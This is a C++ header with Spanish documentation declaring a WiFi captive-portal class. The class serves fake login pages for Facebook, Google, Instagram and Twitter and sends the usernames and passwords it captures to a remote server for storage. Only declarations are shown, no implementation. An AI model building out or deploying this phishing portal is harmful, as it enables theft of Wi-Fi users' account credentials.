/**
 * @file WifiCaptivePortal.h
 * 
 * @author NGUEYOU SIMO, Neil L.; MORENO ROMO, Lucas; RUBIO JIMÉNEZ, Mario
 * 
 * @brief Este archivo declara la clase WiFiCaptiveManager, que gestiona la conexión WiFi
 *        y la creación de un portal cautivo para envío de credenciales y obtención de contenido.
 */


#ifndef WIFI_CAPTIVE_H
#define WIFI_CAPTIVE_H

#include "include.h"


/**
 * @class WiFiCaptiveManager
 * @brief Clase que facilita la configuración de WiFi en modo estación y punto de acceso,
 *        así como la interacción con un servidor para mostrar y enviar información de la
 *        página cautiva.
 */
/**
 * @brief Gestor para la implementación de un punto de acceso con portal cautivo, conectarse
 *        a una red en modo estación, así como la interacción con un servidor para mostrar y
 *        enviar información de la página cautiva.
 * 
 * Esta clase proporciona funcionalidades para crear y gestionar un portal cautivo WiFi,
 * permitiendo la configuración tanto en modo punto de acceso como en modo estación.
 * Facilita la obtención de páginas de inicio de sesión y el manejo de credenciales
 * para diferentes plataformas sociales.
 * 
 * Características principales:
 * - Configuración de modo punto de acceso y estación WiFi
 * - Gestión de conexiones con servidor remoto
 * - Manejo de páginas de inicio de sesión para distintas plataformas
 * - Envío de credenciales para almacenamiento
 * 
 * 
 * @warning Es responsabilidad del usuario asegurar una correcta gestión de memoria
 *          al utilizar los punteros _client y _serverIP
 * 
 * @see WiFiClient
 */
class WiFiCaptiveManager
{
protected:
    WiFiClient *_client; /**< Puntero a objeto WiFiClient que maneja las conexiones salientes. */
    IPAddress  *_serverIP; /**< Puntero a la dirección IP del servidor que recibe y entrega datos. */
    String      _pageContent = "\0"; /**< Almacena el contenido HTML o texto que se recibe desde el servidor. */

    /**
     * @brief Solicita al servidor la página de inicio de sesión para la plataforma dada
     *        y la almacena en _pageContent.
     * 
     * @param platform Nombre o identificador de la plataforma para solicitar la página de login.<br>
     *        Posibles opciones: {`facebook`, `google`, `instagram`, `twitter`}
     * @return Devuelve true si la conexión y lectura del contenido tuvo éxito, de lo contrario false.
     */
    bool getLoginPage(const String &platform);

    /**
     * @brief Envía las credenciales al servidor para que sean almacenadas
     * 
     * @param platform Identificador de la plataforma.
     * @param username Nombre de usuario o identificador.
     * @param password Contraseña asociada al usuario.
     * @return Devuelve true si el envío de credenciales fue exitoso, si no, false.
     */
    bool submitCredentials(const String &platform, const String &username, const String &password);

public:

    /**
     * @brief Constructor por defecto que crea un objeto WiFiClient y no asigna un IPAddress.
     * 
     */
    WiFiCaptiveManager();

    /**
     * @brief Constructor que crea un objeto WiFiClient y asigna un IPAddress al servidor.
     * 
     * @param ip Dirección IP del servidor para la comunicación en el portal cautivo.
     */
    WiFiCaptiveManager(IPAddress &ip);

    /**
     * @brief Destructor que libera la memoria asociada a _client y _serverIP.
     * 
     */
    virtual ~WiFiCaptiveManager();

    WiFiCaptiveManager(const WiFiCaptiveManager &) = delete;

    WiFiCaptiveManager operator=(const WiFiCaptiveManager &) = delete;

    /**
     * @brief Actualiza la dirección IP del servidor donde se gestionan las solicitudes del portal cautivo.
     * 
     * @param IP Objeto IPAddress con la dirección a asignar.
     */
    void setServerIP(const IPAddress &IP);

    /**
     * @brief Devuelve el contenido obtenido por getLoginPage.
     * 
     * @return Referencia a la cadena que contiene el contenido de la página.
     */
    String &getPageContent();

    /**
     * @brief Devuelve la dirección IP almacenada para comunicación con el servidor.
     * 
     * @return Referencia al objeto IPAddress del servidor.
     */
    IPAddress &getServerIp();

    /**
     * @brief Configura una conexión WiFi en modo estación.
     * 
     * @param wifissid Nombre de la red a la que se conectará.
     * @param wifipsw Contraseña de la red (opcional).
     * @param apIp Dirección IP opcional para configuración.
     * @return Devuelve true si la conexión fue exitosa, si no, false.
     */
    static bool setWifiStation(const String &wifissid, const String &wifipsw = "\0",
                                    const IPAddress &apIp = IPAddress(192, 168, 1, 3));

    /**
     * @brief Configura el dispositivo en modo punto de acceso.
     * 
     * @param ssid Nombre del punto de acceso.
     * @param psw Contraseña del punto de acceso (puede ser nulo).
     * @return Devuelve true si se creó el punto de acceso exitosamente, de lo contrario false.
     */
    static bool setAccessPoint(const String &ssid, const String &psw);
};

#endif